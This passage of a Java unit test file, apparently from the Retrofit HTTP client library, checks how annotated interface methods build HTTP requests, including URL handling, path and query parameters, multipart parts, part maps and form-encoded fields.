assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?kit=k%20t&pi%20ng=p%20g\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getAbsoluteUrl() {\n    class Example {\n      @GET(\"http://example2.com/foo/bar/\")\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example2.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithStringUrl() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url String url) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"foo/bar/\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithJavaUriUrl() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url URI url) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, URI.create(\"foo/bar/\"));\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithStringUrlAbsolute() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url String url) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"https://example2.com/foo/bar/\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"https://example2.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithJavaUriUrlAbsolute() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url URI url) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, URI.create(\"https://example2.com/foo/bar/\"));\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"https://example2.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithUrlAbsoluteSameHost() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url String url) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"http://example.com/foo/bar/\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithHttpUrl() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url HttpUrl url) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, HttpUrl.get(\"http://example.com/foo/bar/\"));\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url()).isEqualTo(HttpUrl.get(\"http://example.com/foo/bar/\"));\n    assertThat(request.body()).isNull();\n  }\n\n  @Test public void getWithNullUrl() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url HttpUrl url) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, (HttpUrl) null);\n      fail();\n    } catch (NullPointerException expected) {\n      assertThat(expected).hasMessage(\"@Url parameter is null.\");\n    }\n  }\n\n  @Test public void getWithNonStringUrlThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url Object url) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"foo/bar\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Url must be okhttp3.HttpUrl, String, java.net.URI, or android.net.Uri type.\"\n              + \" (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getUrlAndUrlParamThrows() {\n    class Example {\n      @GET(\"foo/bar\")\n      Call<ResponseBody> method(@Url Object url) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"foo/bar\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"@Url cannot be used with @GET URL (parameter #1)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithoutUrlThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Missing either @GET URL or @Url parameter.\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithUrlThenPathThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url String url, @Path(\"hey\") String hey) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"foo/bar\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"@Path parameters may not be used with @Url. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithPathThenUrlThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Path(\"hey\") String hey, @Url Object url) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"foo/bar\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"@Path can only be used with relative url on @GET (parameter #1)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithQueryThenUrlThrows() {\n    class Example {\n      @GET(\"foo/bar\")\n      Call<ResponseBody> method(@Query(\"hey\") String hey, @Url Object url) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, \"hey\", \"foo/bar/\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"A @Url parameter must not come after a @Query. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithQueryNameThenUrlThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@QueryName String name, @Url String url) {\n        throw new AssertionError();\n      }\n    }\n\n    try {\n      buildRequest(Example.class, Collections.singletonMap(\"kit\", \"kat\"), \"foo/bar/\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"A @Url parameter must not come after a @QueryName. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithQueryMapThenUrlThrows() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@QueryMap Map<String, String> queries, @Url String url) {\n        throw new AssertionError();\n      }\n    }\n\n    try {\n      buildRequest(Example.class, Collections.singletonMap(\"kit\", \"kat\"), \"foo/bar/\");\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"A @Url parameter must not come after a @QueryMap. (parameter #2)\\n\"\n          + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void getWithUrlThenQuery() {\n    class Example {\n      @GET\n      Call<ResponseBody> method(@Url String url, @Query(\"hey\") String hey) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"foo/bar/\", \"hey!\");\n    assertThat(request.method()).isEqualTo(\"GET\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/?hey=hey%21\");\n  }\n\n  @Test public void postWithUrl() {\n    class Example {\n      @POST\n      Call<ResponseBody> method(@Url String url, @Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"hi\");\n    Request request = buildRequest(Example.class, \"http://example.com/foo/bar\", body);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar\");\n    assertBody(request.body(), \"hi\");\n  }\n\n  @Test public void normalPostWithPathParam() {\n    class Example {\n      @POST(\"/foo/bar/{ping}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping, @Body RequestBody body) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"Hi!\");\n    Request request = buildRequest(Example.class, \"pong\", body);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/pong/\");\n    assertBody(request.body(), \"Hi!\");\n  }\n\n  @Test public void emptyBody() {\n    class Example {\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertBody(request.body(), \"\");\n  }\n\n  @Test public void customMethodEmptyBody() {\n    class Example {\n      @HTTP(method = \"CUSTOM\", path = \"/foo/bar/\", hasBody = true) //\n      Call<ResponseBody> method() {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class);\n    assertThat(request.method()).isEqualTo(\"CUSTOM\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n    assertBody(request.body(), \"\");\n  }\n\n  @Test public void bodyRequired() {\n    class Example {\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Body RequestBody body) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e.getMessage()).isEqualTo(\"Body parameter value must not be null.\");\n    }\n  }\n\n  @Test public void bodyWithPathParams() {\n    class Example {\n      @POST(\"/foo/bar/{ping}/{kit}/\") //\n      Call<ResponseBody> method(@Path(\"ping\") String ping, @Body RequestBody body, @Path(\"kit\") String kit) {\n        return null;\n      }\n    }\n    RequestBody body = RequestBody.create(TEXT_PLAIN, \"Hi!\");\n    Request request = buildRequest(Example.class, \"pong\", body, \"kat\");\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/pong/kat/\");\n    assertBody(request.body(), \"Hi!\");\n  }\n\n  @Test public void simpleMultipart() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") String ping, @Part(\"kit\") RequestBody kit) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"pong\", RequestBody.create(\n        TEXT_PLAIN, \"kat\"));\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\\r\\n\")\n        .contains(\"\\r\\npong\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartArray() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") String[] ping) {\n        return null;\n      }\n    }\n\n    Request request =\n        buildRequest(Example.class, new Object[] { new String[] { \"pong1\", \"pong2\" } });\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\\r\\n\")\n        .contains(\"\\r\\npong1\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\")\n        .contains(\"\\r\\npong2\\r\\n--\");\n  }\n\n  @Test public void multipartRequiresName() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part RequestBody part) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part annotation must supply a name or use MultipartBody.Part parameter type. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartIterableRequiresName() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part List<RequestBody> part) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part annotation must supply a name or use MultipartBody.Part parameter type. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartArrayRequiresName() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part RequestBody[] part) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part annotation must supply a name or use MultipartBody.Part parameter type. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartOkHttpPartForbidsName() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"name\") MultipartBody.Part part) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part parameters using the MultipartBody.Part must not include a part name in the annotation. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartOkHttpPart() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part MultipartBody.Part part) {\n        return null;\n      }\n    }\n\n    MultipartBody.Part part = MultipartBody.Part.createFormData(\"kit\", \"kat\");\n    Request request = buildRequest(Example.class, part);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\\r\\n\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartOkHttpIterablePart() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part List<MultipartBody.Part> part) {\n        return null;\n      }\n    }\n\n    MultipartBody.Part part1 = MultipartBody.Part.createFormData(\"foo\", \"bar\");\n    MultipartBody.Part part2 = MultipartBody.Part.createFormData(\"kit\", \"kat\");\n    Request request = buildRequest(Example.class, Arrays.asList(part1, part2));\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"foo\\\"\\r\\n\")\n        .contains(\"\\r\\nbar\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\\r\\n\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartOkHttpArrayPart() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part MultipartBody.Part[] part) {\n        return null;\n      }\n    }\n\n    MultipartBody.Part part1 = MultipartBody.Part.createFormData(\"foo\", \"bar\");\n    MultipartBody.Part part2 = MultipartBody.Part.createFormData(\"kit\", \"kat\");\n    Request request =\n        buildRequest(Example.class, new Object[] { new MultipartBody.Part[] { part1, part2 } });\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"foo\\\"\\r\\n\")\n        .contains(\"\\r\\nbar\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\\r\\n\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartOkHttpPartWithFilename() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part MultipartBody.Part part) {\n        return null;\n      }\n    }\n\n    MultipartBody.Part part =\n        MultipartBody.Part.createFormData(\"kit\", \"kit.txt\", RequestBody.create(null, \"kat\"));\n    Request request = buildRequest(Example.class, part);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"; filename=\\\"kit.txt\\\"\\r\\n\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartIterable() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") List<String> ping) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, Arrays.asList(\"pong1\", \"pong2\"));\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\\r\\n\")\n        .contains(\"\\r\\npong1\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\")\n        .contains(\"\\r\\npong2\\r\\n--\");\n  }\n\n  @Test public void multipartIterableOkHttpPart() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") List<MultipartBody.Part> part) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part parameters using the MultipartBody.Part must not include a part name in the annotation. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartArrayOkHttpPart() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") MultipartBody.Part[] part) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@Part parameters using the MultipartBody.Part must not include a part name in the annotation. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartWithEncoding() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(value = \"ping\", encoding = \"8-bit\") String ping,\n          @Part(value = \"kit\", encoding = \"7-bit\") RequestBody kit) {\n        return null;\n      }\n    }\n\n    Request request = buildRequest(Example.class, \"pong\", RequestBody.create(\n        TEXT_PLAIN, \"kat\"));\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\\r\\n\")\n        .contains(\"Content-Transfer-Encoding: 8-bit\")\n        .contains(\"\\r\\npong\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\")\n        .contains(\"Content-Transfer-Encoding: 7-bit\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartPartMap() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Map<String, RequestBody> parts) {\n        return null;\n      }\n    }\n\n    Map<String, RequestBody> params = new LinkedHashMap<>();\n    params.put(\"ping\", RequestBody.create(null, \"pong\"));\n    params.put(\"kit\", RequestBody.create(null, \"kat\"));\n\n    Request request = buildRequest(Example.class, params);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\\r\\n\")\n        .contains(\"\\r\\npong\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartPartMapWithEncoding() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap(encoding = \"8-bit\") Map<String, RequestBody> parts) {\n        return null;\n      }\n    }\n\n    Map<String, RequestBody> params = new LinkedHashMap<>();\n    params.put(\"ping\", RequestBody.create(null, \"pong\"));\n    params.put(\"kit\", RequestBody.create(null, \"kat\"));\n\n    Request request = buildRequest(Example.class, params);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\\r\\n\")\n        .contains(\"Content-Transfer-Encoding: 8-bit\")\n        .contains(\"\\r\\npong\\r\\n--\");\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"kit\\\"\")\n        .contains(\"Content-Transfer-Encoding: 8-bit\")\n        .contains(\"\\r\\nkat\\r\\n--\");\n  }\n\n  @Test public void multipartPartMapRejectsNonStringKeys() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Map<Object, RequestBody> parts) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@PartMap keys must be of type String: class java.lang.Object (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartPartMapRejectsOkHttpPartValues() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Map<String, MultipartBody.Part> parts) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@PartMap values cannot be MultipartBody.Part. Use @Part List<Part> or a different value type instead. (parameter #1)\\n\"\n              + \"    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartPartMapRejectsNull() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Map<String, RequestBody> parts) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Part map was null.\");\n    }\n  }\n\n  @Test public void multipartPartMapRejectsNullKeys() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Map<String, RequestBody> parts) {\n        return null;\n      }\n    }\n\n    Map<String, RequestBody> params = new LinkedHashMap<>();\n    params.put(\"ping\", RequestBody.create(null, \"pong\"));\n    params.put(null, RequestBody.create(null, \"kat\"));\n\n    try {\n      buildRequest(Example.class, params);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Part map contained null key.\");\n    }\n  }\n\n  @Test public void multipartPartMapRejectsNullValues() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Map<String, RequestBody> parts) {\n        return null;\n      }\n    }\n\n    Map<String, RequestBody> params = new LinkedHashMap<>();\n    params.put(\"ping\", RequestBody.create(null, \"pong\"));\n    params.put(\"kit\", null);\n\n    try {\n      buildRequest(Example.class, params);\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\"Part map contained null value for key 'kit'.\");\n    }\n  }\n\n  @Test public void multipartPartMapMustBeMap() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap List<Object> parts) {\n        return null;\n      }\n    }\n\n    try {\n      buildRequest(Example.class, Collections.emptyList());\n      fail();\n    } catch (IllegalArgumentException e) {\n      assertThat(e).hasMessage(\n          \"@PartMap parameter type must be Map. (parameter #1)\\n    for method Example.method\");\n    }\n  }\n\n  @Test public void multipartPartMapSupportsSubclasses() throws IOException {\n    class Foo extends HashMap<String, String> {\n    }\n\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@PartMap Foo parts) {\n        return null;\n      }\n    }\n\n    Foo foo = new Foo();\n    foo.put(\"hello\", \"world\");\n\n    Request request = buildRequest(Example.class, foo);\n    Buffer buffer = new Buffer();\n    request.body().writeTo(buffer);\n    assertThat(buffer.readUtf8())\n        .contains(\"name=\\\"hello\\\"\")\n        .contains(\"\\r\\n\\r\\nworld\\r\\n--\");\n  }\n\n  @Test public void multipartNullRemovesPart() throws IOException {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") String ping, @Part(\"fizz\") String fizz) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"pong\", null);\n    assertThat(request.method()).isEqualTo(\"POST\");\n    assertThat(request.headers().size()).isZero();\n    assertThat(request.url().toString()).isEqualTo(\"http://example.com/foo/bar/\");\n\n    RequestBody body = request.body();\n    Buffer buffer = new Buffer();\n    body.writeTo(buffer);\n    String bodyString = buffer.readUtf8();\n\n    assertThat(bodyString)\n        .contains(\"Content-Disposition: form-data;\")\n        .contains(\"name=\\\"ping\\\"\")\n        .contains(\"\\r\\npong\\r\\n--\");\n  }\n\n  @Test public void multipartPartOptional() {\n    class Example {\n      @Multipart //\n      @POST(\"/foo/bar/\") //\n      Call<ResponseBody> method(@Part(\"ping\") RequestBody ping) {\n        return null;\n      }\n    }\n    try {\n      buildRequest(Example.class, new Object[] { null });\n      fail();\n    } catch (IllegalStateException e) {\n      assertThat(e.getMessage()).isEqualTo(\"Multipart body must have at least one part.\");\n    }\n  }\n\n  @Test public void simpleFormEncoded() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@Field(\"foo\") String foo, @Field(\"ping\") String ping) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"bar\", \"pong\");\n    assertBody(request.body(), \"foo=bar&ping=pong\");\n  }\n\n  @Test public void formEncodedWithEncodedNameFieldParam() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@Field(value = \"na%20me\", encoded = true) String foo) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"ba%20r\");\n    assertBody(request.body(), \"na%20me=ba%20r\");\n  }\n\n  @Test public void formEncodedFieldOptional() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@Field(\"foo\") String foo, @Field(\"ping\") String ping,\n          @Field(\"kit\") String kit) {\n        return null;\n      }\n    }\n    Request request = buildRequest(Example.class, \"bar\", null, \"kat\");\n    assertBody(request.body(), \"foo=bar&kit=kat\");\n  }\n\n  @Test public void formEncodedFieldList() {\n    class Example {\n      @FormUrlEncoded //\n      @POST(\"/foo\") //\n      Call<ResponseBody> method(@Field(\"foo\") List<Object> 